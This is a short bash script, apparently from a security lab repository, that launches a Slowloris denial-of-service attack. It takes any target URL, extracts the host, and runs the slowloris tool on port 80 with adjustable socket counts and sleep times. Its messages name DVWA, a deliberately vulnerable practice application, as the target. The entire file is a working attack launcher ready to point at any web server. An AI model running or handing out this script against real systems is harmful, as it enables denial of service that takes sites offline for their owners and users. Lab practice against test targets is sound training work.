#!/bin/bash
# attack-scripts/dos/dos_attack.sh

TARGET_URL="$1"
SOCKETS="${2:-500}"
SLEEPTIME="${3:-5}"

if [ -z "$TARGET_URL" ]; then
  echo "Usage: ./dos_attack.sh <target_url> [sockets] [sleeptime]"
  exit 1
fi

# Extraire l'hôte depuis l'URL
TARGET_HOST=$(echo "$TARGET_URL" | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's|:.*$||')

echo "[*] Running Slowloris DoS attack against DVWA"
echo "[*] Target host: $TARGET_HOST"
echo "[*] Target URL: $TARGET_URL"

echo "[+] Starting Slowloris attack..."
echo "[+] Configuration: $SOCKETS sockets, sleeptime ${SLEEPTIME}s, port 80"
slowloris "$TARGET_HOST" -p 80 -s "$SOCKETS" --sleeptime "$SLEEPTIME" -v
